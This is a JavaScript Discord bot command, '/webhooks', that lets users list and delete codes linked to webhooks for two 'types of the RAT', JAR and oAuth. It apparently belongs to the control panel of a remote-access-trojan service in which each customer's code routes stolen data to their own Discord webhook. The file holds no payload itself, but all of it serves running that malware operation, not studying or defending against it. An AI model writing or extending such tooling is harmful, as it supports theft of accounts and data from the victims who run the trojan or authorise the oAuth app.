import { SlashCommandBuilder, EmbedBuilder } from "discord.js";
import * as oAuthDB from "/root/oAuth/database.js";

export const data = new SlashCommandBuilder()
  .setName("webhooks")
  .setDescription("Manage Webhooks.")
  .addSubcommand((subcommand) =>
    subcommand
      .setName("delete")
      .setDescription("Deletes a code.")
      .addStringOption((option) =>
        option
          .setName("type")
          .setDescription("The type of the RAT to delete.")
          .setRequired(true)
          .addChoices({ name: "JAR", value: "jar" }, { name: "oAuth", value: "oauth" })
      )
      .addStringOption((option) => option.setName("code").setDescription("The code to delete.").setRequired(true))
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("list")
      .setDescription("Lists all webhooks.")
      .addStringOption((option) =>
        option
          .setName("type")
          .setDescription("The type of the RAT to list.")
          .setRequired(true)
          .addChoices({ name: "JAR", value: "jar" }, { name: "oAuth", value: "oauth" })
      )
  )
  .setDMPermission(false);

export async function execute(client, interaction) {
  const subcommand = interaction.options.getSubcommand();
  if (subcommand == "delete") {
    const type = interaction.options.getString("type");
    const code = interaction.options.getString("code");
    if (type == "jar") {
      const webhookInfo = await client.db.getWebhook(code);
      if (!webhookInfo || webhookInfo?.user_id != interaction.user.id) {
        return client.sendErrorEmbed(interaction, "This code does not exist");
      }
      await client.db.deleteWebhook(code);

      const embed = new EmbedBuilder()
        .setColor("Red")
        .setTitle("🚫 JAR Code Deleted")
        .addFields(
          { name: "Code", value: `\`\`\`${code}\`\`\``, inline: false },
          { name: "Webhook", value: `\`\`\`${webhookInfo.webhook}\`\`\``, inline: false }
        );

      await interaction.reply({ embeds: [embed], ephemeral: true });
    } else if (type == "oauth") {
      const webhookInfo = await oAuthDB.getWebhook(code);
      if (!webhookInfo || webhookInfo?.owner != interaction.user.id) {
        return client.sendErrorEmbed(interaction, "This code does not exist");
      }
      await oAuthDB.deleteWebhook(code);

      const embed = new EmbedBuilder()
        .setColor("Red")
        .setTitle("🚫 oAuth Code Deleted")
        .addFields(
          { name: "Code", value: `\`\`\`${code}\`\`\``, inline: false },
          { name: "Webhook", value: `\`\`\`${webhookInfo.webhook}\`\`\``, inline: false }
        );

      await interaction.reply({ embeds: [embed], ephemeral: true });
    }
  } else if (subcommand == "list") {
    const type = interaction.options.getString("type");
    const embeds = [];

    if (type == "jar") {
      const webhooks = await client.db.getWebhooks(interaction.user.id);
      var embed = new EmbedBuilder().setColor("Purple").setTitle("JAR Webhooks");
      var i = 0;

      for (const { code, webhook } of webhooks) {
        i++;
        embed.addFields(
          { name: `${i}.`, value: `\u200b`, inline: true },
          { name: "Code", value: `\`\`\`${code}\`\`\``, inline: true },
          { name: "Webhook", value: `\`\`\`${webhook}\`\`\``, inline: true }
        );

        if (i % 5 == 0) {
          embeds.push(embed);
          embed = new EmbedBuilder().setColor("Purple").setTitle("Webhooks");
        }
      }
      if (i == 0 || i % 5 !== 0) {
        embeds.push(embed);
      }
    } else if (type == "oauth") {
      const webhooks = await oAuthDB.getWebhooks(interaction.user.id);
      var embed = new EmbedBuilder().setColor("Purple").setTitle("oAuth Webhooks");
      var i = 0;

      for (const { code, webhook } of webhooks) {
        i++;
        embed.addFields(
          { name: `${i}.`, value: `\u200b`, inline: true },
          { name: "Code", value: `\`\`\`${code}\`\`\``, inline: true },
          { name: "Webhook", value: `\`\`\`${webhook}\`\`\``, inline: true }
        );

        if (i % 5 == 0) {
          embeds.push(embed);
          embed = new EmbedBuilder().setColor("Purple").setTitle("Webhooks");
        }
      }
      if (i == 0 || i % 5 !== 0) {
        embeds.push(embed);
      }
    }

    await interaction.reply({ embeds: embeds, ephemeral: true });
  }
}
